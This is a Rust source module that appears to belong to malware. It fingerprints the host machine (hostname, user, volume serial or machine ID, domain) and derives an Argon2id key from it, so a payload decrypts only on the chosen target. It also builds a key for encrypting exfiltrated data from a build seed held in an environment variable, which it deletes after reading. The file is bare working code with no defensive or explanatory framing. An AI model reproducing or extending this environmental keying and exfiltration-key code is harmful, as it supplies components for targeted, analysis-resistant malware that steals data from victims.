use argon2::{Algorithm, Argon2, Params, Version};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct Fingerprint {
    pub hostname: String,
    pub username: String,
    pub volume_serial: String,
    pub cpu_arch: String,
    pub domain: String,
}

impl Fingerprint {
    pub fn material(&self) -> Vec<u8> {
        format!(
            "{}|{}|{}|{}|{}",
            self.hostname, self.username, self.volume_serial, self.cpu_arch, self.domain
        )
        .into_bytes()
    }
}

pub fn derive_env_key(fp: &Fingerprint, salt: &[u8]) -> [u8; 32] {
    let params = Params::new(64 * 1024, 3, 1, Some(32)).expect("argon2 params");
    let a2 = Argon2::new(Algorithm::Argon2id, Version::V0x13, params);
    let mut out = [0u8; 32];
    a2.hash_password_into(&fp.material(), salt, &mut out)
        .expect("argon2");
    out
}

const ENVKEY_SALT: &[u8] = b"svc_salt_v3";

static EXFIL_KEY: std::sync::OnceLock<[u8; 32]> = std::sync::OnceLock::new();

pub fn runtime_exfil_key() -> [u8; 32] {
    *EXFIL_KEY.get_or_init(|| {
        let mut seed = [0u8; 32];
        if let Ok(v) = std::env::var("SVC_BUILD_SEED") {
            if let Ok(b) = hex_decode_fixed(&v) {
                seed = b;
            }
        }
        std::env::remove_var("SVC_BUILD_SEED");
        let mut h = Sha256::new();
        h.update(b"svc_exfil_key_v3");
        h.update(seed);
        let d = h.finalize();
        let mut k = [0u8; 32];
        k.copy_from_slice(&d);
        k
    })
}

pub fn runtime_envkey(fp: &Fingerprint) -> [u8; 32] {
    derive_env_key(fp, ENVKEY_SALT)
}

fn hex_decode_fixed(s: &str) -> Result<[u8; 32], ()> {
    if s.len() != 64 {
        return Err(());
    }
    let bytes = s.as_bytes();
    let mut out = [0u8; 32];
    for i in 0..32 {
        let hi = nib(bytes[i * 2]).ok_or(())?;
        let lo = nib(bytes[i * 2 + 1]).ok_or(())?;
        out[i] = (hi << 4) | lo;
    }
    Ok(out)
}

fn nib(b: u8) -> Option<u8> {
    match b {
        b'0'..=b'9' => Some(b - b'0'),
        b'a'..=b'f' => Some(b - b'a' + 10),
        b'A'..=b'F' => Some(b - b'A' + 10),
        _ => None,
    }
}

pub fn fingerprint() -> Fingerprint {
    #[cfg(windows)]
    {
        windows_fp()
    }
    #[cfg(target_os = "linux")]
    {
        linux_fp()
    }
    #[cfg(target_os = "macos")]
    {
        macos_fp()
    }
}

#[cfg(windows)]
fn windows_fp() -> Fingerprint {
    let hostname = hostname::get()
        .map(|s| s.to_string_lossy().into_owned())
        .unwrap_or_default();
    let username = whoami::username();
    let volume_serial = read_volume_serial().unwrap_or_default();
    let cpu_arch = std::env::consts::ARCH.to_string();
    let domain = std::env::var("USERDOMAIN").unwrap_or_default();
    Fingerprint {
        hostname,
        username,
        volume_serial,
        cpu_arch,
        domain,
    }
}

#[cfg(windows)]
fn read_volume_serial() -> Option<String> {
    use windows_sys::Win32::Storage::FileSystem::GetVolumeInformationW;
    let root: Vec<u16> = "C:\\\0".encode_utf16().collect();
    let mut serial: u32 = 0;
    unsafe {
        let _ = GetVolumeInformationW(
            root.as_ptr(),
            std::ptr::null_mut(),
            0,
            &mut serial,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
        );
    }
    Some(format!("{:08X}", serial))
}

#[cfg(target_os = "linux")]
fn linux_fp() -> Fingerprint {
    let hostname = hostname::get()
        .map(|s| s.to_string_lossy().into_owned())
        .unwrap_or_default();
    let username = whoami::username();
    let volume_serial = std::fs::read_to_string("/etc/machine-id")
        .map(|s| s.trim().to_string())
        .unwrap_or_default();
    let cpu_arch = std::env::consts::ARCH.to_string();
    let domain = std::fs::read_to_string("/etc/hostname")
        .map(|s| s.trim().to_string())
        .unwrap_or_default();
    Fingerprint {
        hostname,
        username,
        volume_serial,
        cpu_arch,
        domain,
    }
}

#[cfg(target_os = "macos")]
fn macos_fp() -> Fingerprint {
    let hostname = hostname::get()
        .map(|s| s.to_string_lossy().into_owned())
        .unwrap_or_default();
    let username = whoami::username();
    let volume_serial = std::process::Command::new("ioreg")
        .args(["-rd1", "-c", "IOPlatformExpertDevice"])
        .output()
        .ok()
        .and_then(|o| String::from_utf8(o.stdout).ok())
        .and_then(|s| {
            s.lines()
                .find(|l| l.contains("IOPlatformUUID"))
                .map(|l| l.split('"').nth(3).unwrap_or("").to_string())
        })
        .unwrap_or_default();
    let cpu_arch = std::env::consts::ARCH.to_string();
    Fingerprint {
        hostname,
        username,
        volume_serial,
        cpu_arch,
        domain: String::new(),
    }
}
